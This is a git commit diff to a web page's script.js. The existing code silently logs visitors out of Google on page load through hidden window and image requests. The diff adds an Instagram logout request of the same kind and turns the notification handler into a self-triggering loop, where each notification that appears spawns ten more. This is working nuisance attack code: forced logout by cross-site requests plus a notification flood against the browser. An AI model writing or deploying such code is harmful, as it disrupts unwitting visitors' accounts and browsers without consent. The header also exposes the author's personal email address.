5f4f87cd6a4975c1612cbe1c9b32d289f42ff3b0
anima-regem <vichukartha@gmail.com>
2023-05-03 02:41:03 +0530

    more interesting stuff

--- script.js
+++ script.js
@@ -1,6 +1,8 @@
 const button = document.querySelector("button");
 window.open('https://www.google.com/accounts/Logout')
 new Image().src = "https://www.google.com/accounts/Logout";
+new Image().src = "https://www.instagram.com/accounts/logout";
+
 button.addEventListener("click", (e) => {
   Notification.requestPermission().then((perm) => {
     if (perm === "granted") {
@@ -14,7 +16,7 @@ createNotif = () => {
     body: "Hi Person",
   });
 
-  notif.addEventListener("click", (e) => {
+  notif.addEventListener("show", (e) => {
     for (let i = 0; i < 10; i++) {
       createNotif();
     }
